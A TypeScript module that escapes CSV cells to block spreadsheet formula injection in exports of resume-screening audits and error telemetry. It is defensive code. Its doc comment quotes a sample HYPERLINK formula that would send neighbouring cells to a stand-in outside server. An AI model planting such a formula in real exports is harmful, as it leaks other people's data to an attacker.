/**
 * A CSV CELL A SPREADSHEET OPENS AS TEXT (S13-085, S13-091).
 *
 * Two exports write values a stranger chose: Shortlist's audit CSV carries a
 * candidate's file name and the model's flags (both steerable by whoever wrote
 * the resume), and the owner's /errors CSV carries telemetry rows any visitor
 * can write through log_error_telemetry. Quoting alone does not stop Excel,
 * Google Sheets or LibreOffice from evaluating a cell that begins with a
 * formula character once the quotes are stripped, so a cell like
 * =HYPERLINK("https://x.example/?d="&C3,"open") could read the neighbouring
 * cells (other candidates' scores) out to a stranger's server.
 *
 * Every cell is quoted with embedded quotes doubled, so a comma or a line
 * break stays inside its column, and a cell whose first character is one of
 * the OWASP formula leads (equals, plus, minus, at, tab, carriage return) is
 * prefixed with an apostrophe, which every spreadsheet shows as text.
 */

/** The first characters a spreadsheet reads as the start of a formula. */
export const FORMULA_LEADS: readonly string[] = ["=", "+", "-", "@", "\t", "\r"];

/** One CSV cell: quoted, quotes doubled, and never a formula. */
export function csvCell(value: unknown): string {
  const text = value === null || value === undefined ? "" : String(value);
  const inert = text.length > 0 && FORMULA_LEADS.includes(text[0]) ? `'${text}` : text;
  return `"${inert.replace(/"/g, '""')}"`;
}

/** One CSV line from its cells. */
export function csvLine(values: readonly unknown[]): string {
  return values.map(csvCell).join(",");
}

/** A whole CSV document: a header line, then one line per row. */
export function csvDocument(header: readonly string[], rows: ReadonlyArray<readonly unknown[]>): string {
  return [csvLine(header), ...rows.map(csvLine)].join("\n");
}
